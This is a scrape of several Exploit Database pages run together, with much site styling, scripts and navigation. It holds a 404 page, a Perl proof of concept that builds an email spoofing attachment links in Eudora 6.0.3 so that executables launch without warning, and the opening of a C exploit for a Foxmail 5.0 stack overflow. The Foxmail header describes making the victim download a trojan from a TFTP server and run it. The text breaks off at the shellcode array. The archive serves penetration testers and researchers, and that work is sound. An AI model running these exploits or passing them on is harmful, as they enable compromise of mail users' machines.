1458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 162
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 163
Eudora 6.0.3 (Windows) - Attachment Spoofing - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDEudora 6.0.3 (Windows) - Attachment SpoofingEDB-ID:163CVE:2004-1521EDB Verified:Author:anonymousType:remoteExploit:/Platform:WindowsDate:2004-03-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl --use MIME::Base64;print "From: me\n";print "To: you\n";print "Subject: Eudora 6.0.3 on Windows spoof, LaunchProtect\n";print "MIME-Version: 1.0\n";print "Content-Type: multipart/mixed; boundary=\"zzz\"\n";print "\n";print "This is a multi-part message in MIME format.\n";print "--zzz\n";print "Content-Type: text/plain\n";print "Content-Transfer-Encoding: 7bit\n";print "\n";print "Pipe the output of this script into:   sendmail -i victim\n";print "\nWith spoofed attachments, we could 'steal' files if themessagewas forwarded (not replied to).\n";print "\nWithin plain-text email (or plain-text, inline MIME parts)embeddedCR=x0d characters get converted internally into a NUL=x00 and ignored,so we can spoof \"attachment converted\" lines:\n";print "\nThe following work fine (but are boring and/or put upwarnings):\n";print "Attachment Converted\r: \"c:\\winnt\\system32\\calc.exe\"\n";print "Attachment Converted\r: c:\\winnt\\system32\\calc.exe\n";print "(Note how JavaScript is done with IE, web with default browserNetscape)\n";print "Attachment Converted\r: <Ahref=javascript:alert(%27hello%27)>hello.txt</a>\n";print "Attachment Converted\r: <Ahref=http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx>web.txt</a>\n";print "Attachment Converted\r: <Ahref=c:/winnt/system32/calc.exe>file.txt</a>\n";print "\nIf we can guess the full path to the attach directory then canchange the name shown to anything we like, but get broken icon:\n";print "Attachment Converted\r: <Ahref=H:/eudora/attach/calc>file.txt</a>\n";print "\nCuteness value only:\n";print "Attachment Converted\r: <Ahref=c:/winnt/system32/calc.exe>file1.txt</a> xyz <A href=c:/winnt/system32/calc.exe>file2.txt</a>\n";print "\n<x-html>With <b>HTML</b> <i>inclusions</i> we can do<a href=c:/winnt/system32/calc.exe>file</a>,<ahref=\"http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx\">http</a>and<a href=\"javascript:alert(\x27hello\x27)\">javascript</a>references. Any way to exploit this?</x-html>\n";print "\n<x-rich>Can also do RTF inclusions. Can this be abused?</x-rich>\n";print "\nThose <x-xyz></x-xyz> constructs allow spoofingattachments easily, without embedded CR:\n\n";print "HTML\n";print "<x-html></x-html>Attachment Converted: \"xyz\"\n";print "Rich\n";print "<x-rich></x-rich>Attachment Converted: \"xyz\"\n";print "Flowed\n";print "<x-flowed></x-flowed>Attachment Converted: \"xyz\"\n";print "\n";print "\n--zzz\n";print "Content-Type: text/plain; name=\"plain.txt\"\n";print "Content-Transfer-Encoding: 7bit\n";print "Content-Disposition: inline; filename=\"plain.txt\"\n";print "\n";print "Within a 'plain' attachment:\n";print "Attachment Converted\r: \"c:\\winnt\\system32\\calc.exe\"\n";print "\n--zzz\n";print "Content-Type: text/plain; name=\"qp.txt\"\n";print "Content-Transfer-Encoding: quoted-printable \n";print "Content-Disposition: inline; filename=\"qp.txt\"\n";print "\n";print "Within quoted-printable encoded parts still need the embeddedCR:\n";print "=41ttachment=20=43onverted\r=3a\"c:\\winnt\\system32\\calc.exe\"\n";print "\n--zzz\n";print "Content-Type: text/plain; name=\"b64.txt\"\n";print "Content-Transfer-Encoding: base64\n";print "Content-Disposition: inline; filename=\"b64.txt\"\n";print "\n";$z = "Within base64 encoded (plain-text, inline) MIME parts, canspoof\rwithout embedded CR (but line termination is CR-NL):\rAttachment Converted: \"c:\\winnt\\system32\\calc.exe\"\r\n";print encode_base64($z);print "\n--zzz\n";print "Content-Type: text/plain\n";print "Content-Transfer-Encoding: 7bit\n";print "\n";print "\n=====\n";$X = 'README'; $Y = "$X.bat";print "\nThe X - X.exe dichotomy: send a plain $X attachment:\n";$z = "rem Funny joke\r\npause\r\n";print "begin 600 $X\n", pack('u',$z), "`\nend\n";print "\nand (in another message or) after some blurb so is scrolledoff inanother screenful, also send $Y. Clicking on $X does notget it any more (but gets $Y, with a LauchProtect warning):\n";$z = "rem Big joke\r\nrem Should do something nasty\r\npause\r\n";print "begin 600 $Y\n", pack('u',$z), "`\nend\n";print "\n=====\n";print "Eudora 6.0.3 LaunchProtect handles the X-X.exe dichotomy in the attachdirectory only, and allows spoofed attachments pointing to anexecutablestored elsewhere to run without warning:\n";print "Attachment Converted\r: <ahref=c:/winnt/system32/calc>go.txt</a>\n";print "Attachment Converted\r: c:/winnt/system32/calc\n";print "Can be exploited if there is more than one way into attach: in my setupH: and \\\\rome\\home are the same thing, but Eudora does not knowthat.\n";print "These elicit warnings:\n";print "Attachment Converted\r: <ahref=h:/eudora/attach/README>readme.txt</a>\n";print "Attachment Converted\r: h:/eudora/attach/README\n";print "Attachment Converted\r: \\README\n";print "Attachment Converted\r: .\\README\n";print "Attachment Converted\r: \\.\\README\n";print "Attachment Converted\r: ?\\README\n";print "Attachment Converted\r: \\?\\README\n";print "while these do the bad thing without warning:\n";print "Attachment Converted\r: <ahref=file://rome/home/eudora/attach/README>readme</a>\n";print "Attachment Converted\r: //rome/home/eudora/attach/README\n";print "Attachment Converted\r:\\\\rome\\home\\eudora\\attach\\README\n";print "For the default setup, Eudora knows that C:\\Program Filesand C:\\Progra~1 are the same thing:\n";print "Attachment Converted\r: \"c:/programfiles/qualcomm/eudora/attach/README\"\n";print "Attachment Converted\r:\"c:/progra~1/qualcomm/eudora/attach/README\"\n";print "and also knows that various UNC references:\\\\localhost\\c...\\\\127.0.0.1\\c...\\\\BIOSNAME\\c...\\\\DNSNAME\\c...\\\\IP\\c...\\\\\\?\\c...\\\\c......c:\\progr......c\\progr......c:progr......program files\\......progra~1\\...or even.\\NoSuchDir\\..\\README//c|\\Program Files\\qualcomm\\eudora\\attach\\README\\\\c|\\Program Files\\qualcomm\\eudora\\attach\\READMEres://c:\\Program Files\\qualcomm\\eudora\\attach\\READMEres:\\\\c:\\Program Files\\qualcomm\\eudora\\attach\\READMEshell:Fonts\\..\\..\\Program Files\\qualcomm\\eudora\\attach\\README%ProgramFiles%\\qualcomm\\eudora\\attach\\README%windir%\\..\\Program Files\\qualcomm\\eudora\\attach\\READMEare all the same thing...";print "\n";print "\n--zzz--\n";print "\n";# milw0rm.com [2004-03-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 164
Foxmail 5.0 - 'PunyLib.dll' Remote Stack Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDFoxmail 5.0 - 'PunyLib.dll' Remote Stack OverflowEDB-ID:164CVE:2004-2719EDB Verified:Author:xfocusType:remoteExploit:/Platform:WindowsDate:2004-03-23Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* fmx.c - x86/win32 Foxmail 5.0 PunyLib.dll remote stack buffer overflow exploit** (C) COPYRIGHT XFOCUS Security Team, 2004* All Rights Reserved* -----------------------------------------------------------------------* Author   : xfocus <webmaster@xfocus.org>*          : http://www.xfocus.org* Maintain : XFOCUS Security Team <security@xfocus.org>* Version  : 0.2** Test     : Windows 2000 server GB/XP professional*                + Foxmail 5.0.300.0* Notes    : unpublished vul.* Greets   : all member of XFOCUS Security Team.* Complie  : cl fmx.c* Usage    : fmx <mail_addr> <tftp_server> <smtp_server>*             mail_addr: email address we wantto hack*             tftp_server: run a tftp server and have a a.exe trojan*             smtp_server: SMTP server don't need login, we send the email thru it** Date     : 2004-02-27* Revised  : 2004-03-05** Revise History:* 2003-03-05  call WinExec() addr of Foxmail.exe module to run tftp for down&execute*/#include <stdio.h>#include <stdlib.h>#include <windows.h>#pragma comment (lib,"ws2_32")//mail body, it's based on a real spam email, hehunsigned char packet[] ="From: %s\r\n" //buffer to overrun"Subject: Hi,man\r\n""MIME-Version: 1.0\r\n""Content-Type: multipart/mixed; boundary=\"87122827\"\r\n""\r\n""\r\n""--87122827\r\n""Content-Type: text/plain; charset=us-ascii\r\n""Content-Transfer-Encoding: 7bit\r\n""\r\n""T\r\n""\r\n""--87122827\r\n""Content-Disposition: attachment\r\n""Content-Type: Text/HTML;\r\n""  name=\"girl.htm\"\r\n""Content-Transfer-Encoding: 7bit\r\n""\r\n""<html></html>\r\n""--87122827--\r\n""\r\n"".\r\n";//tiny shellcode to run WinExec() address in Foxmail.exe module(foxmail 5.0.300)unsigned char winexec[] 